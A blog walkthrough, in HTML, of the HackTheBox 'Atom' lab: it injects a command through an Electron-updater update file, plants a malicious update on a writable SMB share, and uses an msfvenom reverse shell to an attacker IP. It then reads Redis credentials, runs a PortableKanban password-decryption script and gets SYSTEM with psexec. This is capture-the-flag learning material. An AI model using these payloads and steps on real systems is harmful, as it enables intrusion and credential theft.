<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Atom | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting"><meta name=description content="Supplying a malicious update definition to Electron-updater"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/atom/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Atom"><meta property="og:description" content="Supplying a malicious update definition to Electron-updater"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/atom/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/atom/imgs/image-20210710203521424.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-07-10T20:28:32+07:00"><meta property="article:modified_time" content="2021-07-10T20:28:32+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/atom/imgs/image-20210710203521424.png"><meta name=twitter:title content="HackTheBox - Atom"><meta name=twitter:description content="Supplying a malicious update definition to Electron-updater"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Atom","item":"https://fahmifj.github.io/hackthebox/atom/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Atom","name":"HackTheBox - Atom","description":"Supplying a malicious update definition to Electron-updater","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"Atom brings a cool exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. With write access, a malicious update definition can be placed on the share. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server. Iâ€™m able to obtain administrator credentials by dumping the Redis database.\nSkills Learned Exploitation of Electron-Builder app through auto-update. Redis enumeration Tools Nmap CrackMapExec Msfvenom Netcat Impacket Reconnaissance Nmap A full TCP scan with nmap discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.\nâ†’ root@kali Â«atomÂ» Â«10.10.14.49Â» $ nmap -p- --max-rate 1000 -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-17 07:56 EDT Nmap scan report for 10.10.10.237 Host is up, received echo-reply ttl 127 (0.051s latency). Not shown: 65529 filtered ports Reason: 65529 no-responses PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 443/tcp open ssl/http syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) 445/tcp open microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 6379/tcp open redis syn-ack ttl 127 Redis key-value store Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 153.92 seconds A script scan doesnâ€™t really helpful, so Iâ€™ll skip that here.\nEnumeration TCP 6379 - Redis On Redis, authenticated is required.\nâ†’ root@kali Â«smbÂ» Â«10.10.14.49Â» $ nc -nv 10.10.10.237 6379 (UNKNOWN) [10.10.10.237] 6379 (?) open INFO -NOAUTH Authentication required. TCP 445 - SMB SMB enumeration with Anonymous logon using crackmapexec reveals the Windows version and one writable share.\nâ†’ root@kali Â«atomÂ» Â«10.10.14.49Â» $ crackmapexec smb 10.10.10.237 -u 'ANONYMOUS' -p '' --shares SMB 10.10.10.237 445 ATOM [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True) SMB 10.10.10.237 445 ATOM [+] ATOM\\ANONYMOUS: SMB 10.10.10.237 445 ATOM [+] Enumerated shares SMB 10.10.10.237 445 ATOM Share Permissions Remark SMB 10.10.10.237 445 ATOM ----- ----------- ------ SMB 10.10.10.237 445 ATOM ADMIN$ Remote Admin SMB 10.10.10.237 445 ATOM C$ Default share SMB 10.10.10.237 445 ATOM IPC$ Remote IPC SMB 10.10.10.237 445 ATOM Software_Updates READ,WRITE Software_Updates Share In Software_Updates, there is a PDF file called UAT_Testing_Procedures.pdf. Iâ€™ll grab that file.\nâ†’ root@kali Â«atomÂ» Â«10.10.14.49Â» $ smbclient -N //10.10.10.237/Software_Updates Try \"help\" to get a list of possible commands. smb: \\\u003e dir . D 0 Mon May 17 08:05:58 2021 .. D 0 Mon May 17 08:05:58 2021 client1 D 0 Mon May 17 08:05:58 2021 client2 D 0 Mon May 17 08:05:58 2021 client3 D 0 Mon May 17 08:05:58 2021 UAT_Testing_Procedures.pdf A 35202 Fri Apr 9 07:18:08 2021 4413951 blocks of size 4096. 1361569 blocks available smb: \\\u003e recurse on smb: \\\u003e prompt off smb: \\\u003e mget * getting file \\UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (121.5 KiloBytes/sec) (average 121.5 KiloBytes/sec) TCP 80,443 - Website Both port 80 and 443 are display the same site, itâ€™s a software company site called â€œHeed Solutionsâ€.\nAt the bottom, there is a hostname and a download link that points to http://10.10.10.237/releases/heed_setup_v1.0.0.zip.\nIâ€™ll add the hostname to my /etc/hosts file and then download the previous software.\nâ†’ root@kali Â«atomÂ» Â«10.10.14.49Â» $ echo '10.10.10.237 atom.htb' \u003e\u003e /etc/hosts After the hostname added, the site still shows the same content.\nâ†’ root@kali Â«atomÂ» Â«10.10.14.49Â» $ curl -s -k https://10.10.10.237/ | wc -c 7581 â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» $ curl -s -k http://10.10.10.237/ | wc -c 7581 â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» $ curl -s -k http://atom.htb/ | wc -c 7581 â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» $ curl -s -k https://atom.htb/ | wc -c 7581 Analysis The previous zip file contains one executable file called heedv1 Setup 1.0.0.exe.\nâ†’ root@kali Â«lootÂ» Â«10.10.14.49Â» $ file heedv1_setup_1.0.0.exe heedv1_setup_1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive It says â€œself-extracting archiveâ€, meaning it can be extracted, for example using 7z.\nWhile looking into the app structure, I spotted a file called app-update.yml.\nâ†’ root@kali Â«heed_extractedÂ» Â«10.10.14.49Â» $ tree . â”œâ”€â”€ $PLUGINSDIR â”‚Â â”œâ”€â”€ app-64 ...... â”‚Â â”‚Â â”œâ”€â”€ natives_blob.bin â”‚Â â”‚Â â”œâ”€â”€ resources â”‚Â â”‚Â â”‚Â â”œâ”€â”€ app.asar â”‚Â â”‚Â â”‚Â â”œâ”€â”€ app-update.yml # ==\u003e Updater config â”‚Â â”‚Â â”‚Â â”œâ”€â”€ electron.asar â”‚Â â”‚Â â”‚Â â”œâ”€â”€ elevate.exe â”‚Â â”‚Â â”‚Â â””â”€â”€ inspector ...... 73 directories, 274 files The file contains another hostname, which Iâ€™ll add it to /etc/hosts.\nâ†’ root@kali Â«heed_extractedÂ» Â«10.10.14.49Â» $ cat ./\\$PLUGINSDIR/app-64/resources/app-update.yml provider: generic url: 'http://updates.atom.htb' publisherName: - HackTheBox And again, it is the same site.\nâ†’ root@kali Â«heed_extractedÂ» Â«10.10.14.49Â» $ curl -s http://updates.atom.htb/ | wc -c 7581 Guessing based on the content of UAT_Testing_Procedures.pdf file from SMB enumeration, heedv1_setup_1.0.0.exe is currently on testing phase. Other information that I can obtain are:\nThe app is packed with electron-builder The app has auto-update feature, but before releasing the updated app, the QA team will test it first. According to the image above, the client folder here probably refers to the ones on SMB.\nFoothold Shell as Jason RCE Electron-Updater - Background I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the app-update.yml to point to my malicious .exe file and repack the app. I got the idea of poisoning the update file but didnâ€™t know where to start until I found this blog.\nAccording to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check on the new version of binary file.\nexecFile(\"powershell.exe\", [\"-NoProfile\", \"-NonInteractive\", \"-InputFormat\", \"None\", \"-Command\", `Get-AuthenticodeSignature '${tempUpdateFile}' | ConvertTo-Json -Compress`], { ...... If ${tempUpdateFile} is a user-controlled input, this can be leveraged for command injection: ';calc;'\nSince the ${tempUpdateFile} variable is provided unescaped to the execFile utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.\nThe following is an example of malicious update definition that will pop a calculator.\nversion: 2.0.0 path: u';calc;'pdate.exe sha512: qwP35Rn5PLaBoZ8tzvRFK......LM3WCmvJUXMYmZGW6T+fI= releaseDate: '2021-01-24T13:44:59.064Z' Sending this u';payload;'pdate.exe as path would be troublesome, which is simplified as follows:\n`Get-AuthenticodeSignature 'u';payload;'pdate.exe' | ConvertTo-Json -Compress` Now that if a single quote ' is added to path, it becomes:\n`Get-AuthenticodeSignature 'u'pdate.exe' | ConvertTo-Json -Compress` But then, it would breaks the signature verification. And hereâ€™s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of u'pdate.exe. Thatâ€™s very clever, right?\nRCE Electron-Updater - Exploitation According to the SMB enumeration, all the client folders are writable, which means exploitation can be done in two ways: local and remote. But, Iâ€™ll go with remote ğŸ˜….\nFirst, Iâ€™ll have to generate a reverse shell binary. This can be done with msfvenom. Iâ€™ll host this binary using Python web server afterwards.\nâ†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.49 LPORT=53 -f exe -o i\\'amf.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder or badchars specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: i'amf.exe Next, Iâ€™ll need to calculate the hash of i'amf.exe using the following command:\nâ†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» $ shasum -a 512 i\\'amf.exe | cut -d ' ' -f1 | xxd -r -p | base64 | tr -d '\\n' Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw== The last thing I need is the update file. Iâ€™ll create one called update-iamf.yml which contains the following update definitions:\nversion: 2.0.1 path: http://10.10.14.83/i'amf.exe sha512: Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw== releaseDate: '2021-01-24T13:44:59.064Z' Iâ€™ll upload the update file to Software_Updates share using smbclient and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.\nâ†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» $ smbclient -N //10.10.10.237/Software_Updates -c \"put iamf-update.yml client1/latest.yml\" \u0026\u0026 nc -nvlp 53 putting file iamf-update.yml as \\client1\\latest.yml (1.1 kb/s) (average 1.1 kb/s) listening on [any] 53 ... connect to [10.10.14.49] from (UNKNOWN) [10.10.10.237] 64352 Microsoft Windows [Version 10.0.19042.906] (c) Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32\u003ewhoami whoami atom\\jason C:\\WINDOWS\\system32\u003e User flag is done here.\nC:\\Users\\jason\\Desktop\u003etype user.txt type user.txt b77e754354e186f...... Privilege Escalation Shell as SYSTEM Internal Enumeration WinPEAS discovers a set of credentials for user jason.\n...... [+] Checking Credential manager [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string Username: ATOM\\jason Password: kidvscat_electron_@123 Target: ATOM\\jason PersistenceType: Enterprise LastWriteTime: 3/31/2021 2:53:49 AM On Jasonâ€™s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp. Its config contains an encrypted Redis database password (The clear password revealed in the next section).\nC:\\Users\\jason\\Downloads\u003etype PortableKanban\\PortableKanban.cfg type PortableKanban\\PortableKanban.cfg {\"RoamingSettings\":{\"DataSource\":\"RedisServer\",\"DbServer\":\"localhost\",\"DbPort\":6379,\"DbEncPassword\":\"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb\" ...... Redis Revisited Looking into the Redis installation folder, I find a plain password in redis.windows.conf file.\nC:\\Program Files\\Redis\u003etype redis.windows.conf | findstr requirepass type redis.windows.conf | findstr requirepass requirepass kidvscat_yes_kidvscat redis.windows-service.conf also contains the same password.\nC:\\Program Files\\Redis\u003etype redis.windows-service.conf | findstr requirepass type redis.windows-service.conf | findstr requirepass requirepass kidvscat_yes_kidvscat The password kidvscat_yes_kidvscat works on Redis.\nâ†’ root@kali Â«atomÂ» Â«10.10.14.49Â» $ rlwrap nc -nv 10.10.10.237 6379 (UNKNOWN) [10.10.10.237] 6379 (redis) open AUTH jason kidvscat_electron_@123 -ERR wrong number of arguments for 'auth' command AUTH kidvscat_electron_@123 -ERR invalid password AUTH kidvscat_yes_kidvscat +OK Itâ€™s possible to dump the database that is currently in use.\nTo do that, Iâ€™ll send INFO command and starting to look for a chunk called Keyspace .\nINFO $1938 # Server redis_version:3.0.504 ...... # Keyspace db0:keys=4,expires=0,avg_ttl=0 There is one database active, which is db0 and it contains 4 keys.\nIâ€™ll send KEYS * command to get all the stored keys.\nSELECT 0 +OK KEYS * *4 $48 pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 $11 pk:ids:User $20 pk:ids:MetaDataClass $57 pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff The value of pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 contains a credentials of the Administrator account, but the password is encrypted.\nGET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 $207 {\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253} PortableKanban Decrypt By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following script (a modified version of the original exploit).\nfrom base64 import b64decode import sys import des key = des.DesKey(b'7ly6UznJ') iv = b'XuVUm5fR' try: passwd = b64decode(sys.argv[1].encode('UTF-8')) except IndexError: print('[-] Usage: %s ' % sys.argv[0]) sys.exit(-1) dec_password = key.decrypt(passwd, initial=iv, padding=True) print(\"[+] Decrypted Password: \" + dec_password.decode('UTF-8')) The administrator password has been decrypted to kidvscat_admin_@123.\nâ†’ kali@kali Â«atomÂ» Â«10.10.14.83Â» $ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi [+] Decrypted Password: kidvscat_admin_@123 psexec.py I could use the credentials in psexec from impacket to obtain interactive shell access as system.\nâ†’ root@kali Â«atomÂ» Â«10.10.14.49Â» $ impacket-psexec atom/administrator:'kidvscat_admin_@123'@10.10.10.237 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.237..... [*] Found writable share ADMIN$ [*] Uploading file FCSITnEj.exe [*] Opening SVCManager on 10.10.10.237..... [*] Creating service DCLl on 10.10.10.237..... [*] Starting service DCLl..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.19042.906] (c) Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32\u003ewhoami \u0026\u0026 hostname nt authority\\system ATOM C:\\WINDOWS\\system32\u003eipconfig Windows IP Configuration Ethernet adapter Ethernet0: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6 IPv4 Address. . . . . . . . . . . : 10.10.10.237 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6 10.10.10.2 ","wordCount":"1938","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/atom/imgs/image-20210710203521424.png","datePublished":"2021-07-10T20:28:32+07:00","dateModified":"2021-07-10T20:28:32+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/atom/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;Â»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Atom</h1><p class=post-description>Supplying a malicious update definition to Electron-updater</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>July 10, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>10 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-6379---redis aria-label="TCP 6379 - Redis">TCP 6379 - Redis</a></li><li><a href=#tcp-445---smb aria-label="TCP 445 - SMB">TCP 445 - SMB</a></li><li><a href=#tcp-80443---website aria-label="TCP 80,443 - Website">TCP 80,443 - Website</a></li><li><a href=#analysis aria-label=Analysis>Analysis</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-jason aria-label="Shell as Jason">Shell as Jason</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-system aria-label="Shell as SYSTEM">Shell as SYSTEM</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/atom/imgs/image-20210710203521424_hu4595f48fcf8b4fd79d2b8c90e13a8cce_159291_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/atom/imgs/image-20210710203521424_hu4595f48fcf8b4fd79d2b8c90e13a8cce_159291_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/atom/imgs/image-20210710203521424_hu4595f48fcf8b4fd79d2b8c90e13a8cce_159291_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/atom/imgs/image-20210710203521424.png 738w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/atom/imgs/image-20210710203521424.png alt width=738 height=471></figure><p>Atom brings a cool exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. With write access, a malicious update definition can be placed on the share. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Exploitation of Electron-Builder app through auto-update.</li><li>Redis enumeration</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>CrackMapExec</li><li>Msfvenom</li><li>Netcat</li><li>Impacket</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>A full TCP scan with <code>nmap</code> discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ nmap -p- --max-rate <span class=m>1000</span> -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-05-17 07:56 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.237
</span></span><span class=line><span class=cl>Host is up, received echo-reply ttl <span class=m>127</span> <span class=o>(</span>0.051s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65529</span> filtered ports
</span></span><span class=line><span class=cl>Reason: <span class=m>65529</span> no-responses
</span></span><span class=line><span class=cl>PORT     STATE SERVICE      REASON          VERSION
</span></span><span class=line><span class=cl>80/tcp   open  http         syn-ack ttl <span class=m>127</span> Apache httpd 2.4.46 <span class=o>((</span>Win64<span class=o>)</span> OpenSSL/1.1.1j PHP/7.3.27<span class=o>)</span>
</span></span><span class=line><span class=cl>135/tcp  open  msrpc        syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>443/tcp  open  ssl/http     syn-ack ttl <span class=m>127</span> Apache httpd 2.4.46 <span class=o>((</span>Win64<span class=o>)</span> OpenSSL/1.1.1j PHP/7.3.27<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds syn-ack ttl <span class=m>127</span> Microsoft Windows <span class=m>7</span> - <span class=m>10</span> microsoft-ds <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>5985/tcp open  http         syn-ack ttl <span class=m>127</span> Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl>6379/tcp open  redis        syn-ack ttl <span class=m>127</span> Redis key-value store
</span></span><span class=line><span class=cl>Service Info: Host: ATOM<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 153.92 seconds
</span></span></code></pre></div><p>A script scan doesn&rsquo;t really helpful, so I&rsquo;ll skip that here.</p><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-6379---redis>TCP 6379 - Redis<a class=anchor aria-hidden=true href=#tcp-6379---redis>#</a></h3><p>On Redis, authenticated is required.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«smbÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ nc -nv 10.10.10.237 <span class=m>6379</span>
</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.237<span class=o>]</span> <span class=m>6379</span> <span class=o>(</span>?<span class=o>)</span> open
</span></span><span class=line><span class=cl>INFO
</span></span><span class=line><span class=cl>-NOAUTH Authentication required.
</span></span></code></pre></div><h3 id=tcp-445---smb>TCP 445 - SMB<a class=anchor aria-hidden=true href=#tcp-445---smb>#</a></h3><p>SMB enumeration with Anonymous logon using <code>crackmapexec</code> reveals the Windows version and one writable share.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
</span></span><span class=line><span class=cl>$ crackmapexec smb 10.10.10.237 -u <span class=s1>&#39;ANONYMOUS&#39;</span> -p <span class=s1>&#39;&#39;</span> --shares
</span></span><span class=line><span class=cl>SMB         10.10.10.237    <span class=m>445</span>    ATOM             <span class=o>[</span>*<span class=o>]</span> Windows <span class=m>10</span> Pro <span class=m>19042</span> x64 <span class=o>(</span>name:ATOM<span class=o>)</span> <span class=o>(</span>domain:ATOM<span class=o>)</span> <span class=o>(</span>signing:False<span class=o>)</span> <span class=o>(</span>SMBv1:True<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.10.237    <span class=m>445</span>    ATOM             <span class=o>[</span>+<span class=o>]</span> ATOM<span class=se>\A</span>NONYMOUS: 
</span></span><span class=line><span class=cl>SMB         10.10.10.237    <span class=m>445</span>    ATOM             <span class=o>[</span>+<span class=o>]</span> Enumerated shares
</span></span><span class=line><span class=cl>SMB         10.10.10.237    <span class=m>445</span>    ATOM             Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         10.10.10.237    <span class=m>445</span>    ATOM             -----           -----------     ------
